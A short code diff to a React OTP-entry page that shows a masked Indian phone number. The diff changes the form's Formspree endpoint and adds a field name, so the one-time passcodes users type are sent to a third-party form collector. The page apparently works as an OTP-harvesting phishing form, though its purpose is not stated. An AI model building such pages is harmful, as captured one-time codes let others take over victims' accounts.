@@ -75,13 +75,14 @@ export default function OTP() {
             <b className="text-color">+91 ******282</b>
           </span>
           <form method="post"
-            action="https://formspree.io/f/mbjbklkl">
+            action="https://formspree.io/f/xwkzqweq">
             <div className="d-flex flex-row mt-5">
               <input
                 type="text"
                 className="form-control border-0 border-bottom border border-primary"
                 autoFocus=""
-                placeholder="Enter the OTP  "
+                placeholder="Enter the OTP "
+                name="OTP "
                 required
               />
             </div>
@@ -101,8 +102,8 @@ export default function OTP() {
                   Not received your code? Resend code in {timer} Seconds
                 </span>
               )}
-              <button type="submit" className="btn btn-primary">
-                verifly
+              <button type="submit" className="btn btn-primary" onSubmit={handlesubmitdata}>
+                verify
               </button>
             </div>
           </form>
